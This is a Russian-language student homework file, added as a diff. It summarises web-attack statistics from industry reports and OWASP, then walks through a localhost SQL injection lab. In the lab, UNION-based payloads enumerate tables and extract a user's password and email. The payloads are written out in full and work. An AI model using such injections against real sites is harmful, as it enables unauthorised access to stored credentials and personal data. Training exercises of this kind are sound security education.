@@ -1,0 +1,115 @@
+Для I части дз необходимо почитать исследовательские отчеты в российских и
+зарубежных источниках. Источники вы должны найти сами
+1. ссылки на источники
+2. доля успешных атак на организации, проведенных с помощью эксплуатации вебуязвимостей
+3. распределение по конкретным уязвимостям.
+Если по разным источникам данные рознятся, можете указать scope, для которого
+проводилось исследование (например, для гос организаций - такой-то процент, для ITкомпаний - такой-то).
+За эту часть задания дается 4 балла
+
+
+
+Часть 1
+
+
+
+Пункт 1. Ссылка на источники
+https://owasp.org/Top10/2025/
+https://www.verizon.com/business/resources/reports/2025-dbir-executive-summary.pdf
+https://www.bosconsulting.lt/reports/ibm-x-force-threat-intelligence-index-2025-report.pdf
+https://ptsecurity.com/about/news/pt-named-weaknesses-in-cyber-defense-of-companies/
+https://rt-solar.ru/analytics/reports/5375/
+
+Пункт 2. Доля успешных атак на огранизации, проведенных с помощью эксплуатации вебуязвимостей
+
+A. Verizon DBIR
+Verizon DBIR 2025 в своем глобальном отчете показывает, что эксплуатация веб-уязвимостей достигла 20% всех подтвержденных сценариев компрометации, при этом показатель вырос примерно на 34% по сравнению с прошлым годом. 
+
+B. Positive Technologies
+По данным нашей (российской) компании Positive Technologies самым распространенным способом проникновения в корпоративную является эксплуатация уязвимостей в веб-приложениях, доступных с внешнего периметра, доля составляет 36%.
+
+С. IBM
+По данным IBM X-Force в организациях критической инфраструктуры эксплуатация доступных извне приложений составила 33% способов первоначального проникновения, в четверти атак на объекты критической инфраструктуры причиной становилась  эксплуатация веб-уязвимостей. 
+
+Пункт 3. Распределение по конкретным уязвимостям
+
+Данные из OWASP Top10 за 2025 год
+AIR - Average Incidence Rate - показывает, насколько часто в среднем уязвимости этой категории встречались в исследованной выборке приложений.
+AC  - Average Coverage - в какой доле приложений вообще была найдена хотя бы одна такая уязвимость.
+TO  - Total Occurences - сколько всего таких обнаружений суммарно зафиксировано по всей выборке OWASP.
+| Категория                              |   AIR |     AC |                     TO |
+| ------------------------------------- | ----: | -----: | ---------------------: |
+| Broken Access Control                 | 3.74% | 42.93% | 1,839,701 |
+| Security Misconfiguration             | 3.00% | 52.35% |   719,084 |
+| Software Supply Chain Failures        | 5.72% | 27.47% |   215,248 |
+| Cryptographic Failures                | 3.80% | 47.74% | 1,665,348 |
+| Injection                             | 3.08% | 42.93% | 1,404,249 |
+| Insecure Design                       | 1.86% | 35.18% |   729,882 |
+| Authentication Failures               | 2.92% | 37.14% | 1,120,673 |
+| Software or Data Integrity Failures   | 2.75% | 45.49% |   501,327 |
+| Security Logging & Alerting Failures  | 3.91% | 46.48% |   260,288 |
+| Mishandling of Exceptional Conditions | 2.95% | 37.95% |  769,581  |
+
+
+
+
+Часть 2
+Задания - "1. узнать пароль пользователя с ником Volk2; 2. узнать почту пользователя с ником Vinni-pukh"
+
+"Введите в качестве параметра ваш id" - Сначала подумал, что ид должен быть где-то в задании записан, или в группе исада где-нибудь, потом понял что это так не работает и просто нужно вводить что-угодно.
+
+Сначала ввел "http://localhost:8080/task/?id=27" - пустой вывод, шикарно. 
+В итоге методом от противного дошел до "http://localhost:8080/task/?id=10" - все равно пустой ввод. 
+А вот уже "http://localhost:8080/task/?id=9" - это уже Непустой ввод, точнее ""Ваш id:9; Ваш логин:Volk2"". 
+
+Я правда не сразу обнаружил что Volk2, точнее даже понял что он мне и нужен, и в итоге просто доскипал до id=1 а потом уже осенило, что я чет не туда пошел. И еще пролистыванием от id=1 до id=9 запомнил что идентификаторов всего 9 штук (n=9).
+Значит у Volk2 id=9.
+
+Интиутивная проверка на уязвимость простой инъекцией, ну точнее добавлением " ' " в конце реквеста - "http://localhost:8080/task/?id=9%27". Вижу "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''9'' LIMIT 0,1' at line 1", следовательно добавленная кавычка вызвала синтаксическую ошибку у MySQL, это означает что присутствует уязвимость типа SQL инъекции.
+
+Потом пошел определить сколько столбцов у нас в бд. Если что запросы немного мусорные будут прикрепляться с %, но я вводил в более удобном формате, просто перекопировать обратно очень неудобно.
+Попробовал "http://localhost:8080/task/?id=09%27%20order%20by%2010%20--+" - "Unknown column '10' in 'order clause'", окей, у нас меньше 10 столбцов.
+"http://localhost:8080/task/?id=09%27%20order%20by%205%20--+" - "Unknown column '5' in 'order clause'", меньше пяти.
+"http://localhost:8080/task/?id=09%27%20order%20by%204%20--+" - "Unknown column '4' in 'order clause'", меньше четырех.
+"http://localhost:8080/task/?id=09%27%20order%20by%203%20--+" - "Ваш id:9 Ваш логин:Volk2", О значит у нас 3 столбца отлично.
+
+Дальше по логике очевидно хотелось бы узнать Имя у нашей базы данных.
+Начал с "http://localhost:8080/task/?id=9%27%20union%20select%201,database(),3%20--+" - "Ваш id:9 Ваш логин:Volk2".
+"http://localhost:8080/task/?id=27%27%20union%20select%201,database(),3%20--+" - "Ваш id:1 Ваш логин:security", окей.
+
+Базово через "curl -s "http://localhost:8080/task/?id=27'+UNION+SELECT+1,GROUP_CONCAT(table_name+SEPARATOR+','),3+FROM+information_schema.tables+WHERE+table_schema=database()--+-"" (уже в консоли) узнаю все таблицы в бд - 
+"
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>SQLi task</title>
+</head>
+
+<body>
+<div>
+
+
+
+
+
+
+Ваш id:1<br>Ваш логин:emails,users</div></br></br>
+</body>
+</html>
+". Значит Всего существует emails и users, негусто.
+Раз знаю таблицы грех не узнать столбцы, точнее их названия.
+"http://localhost:8080/task/?id=27%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27%20--+" - "Ваш id:1 Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password"
+"http://localhost:8080/task/?id=27%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27emails%27%20--+" - "Ваш id:1 Ваш логин:id,email_id".
+
+Сначала я подумал лишний раз в файл задания не смотреть, там вроде пароль волка надо было найти, ну я вот и ввел - "http://localhost:8080/task/?id=27%27%20union%20select%201,password,3%20from%20users%20where%20username=%27Volk%27%20--+". Получил "Ваш id:1 Ваш логин:nu zayzc, nu pogodi!".
+
+Вот, а потом уже на следующий день перед отправкой увидел, что Volk2 а не Volk обычный нужен был, а я уже и забыл что их там двое в бд. Ну и да.
+"http://localhost:8080/task/?id=27%27%20union%20select%201,password,3%20from%20users%20where%20username=%27Volk2%27%20--+" - выдало "Ваш id:1 Ваш логин:Wa spoiuuuuu". Значит ответ на первое задание - "Wa spoiuuuuu", т.е. пароль волка2.
+
+
+Так как я уже ранее делал запросы на названия столбцов в emails, я уже знаю что там только id и email_id. Главное, что я либо снова забыл либо и не видел какой айди у винипуха, поэтому нахожу базовыми реквестами.
+"http://localhost:8080/task/?id=1" не он. 
+"http://localhost:8080/task/?id=2" не он.
+"http://localhost:8080/task/?id=3" не он.
+"http://localhost:8080/task/?id=4" - "Ваш id:4 Ваш логин:Vinni-pukh" вот и нашли.
+
+Тогда чтобы найти почту винипуха юзаю "http://localhost:8080/task/?id=27%27%20union%20select%201,email_id,3%20from%20emails%20where%20id=4%20--+" и получаю "Ваш id:1 Ваш логин:honey_lover@otus-lab.com". Значит ответ на второе задание - "honey_lover@otus-lab.com", т.е. электронная почта винипуха.
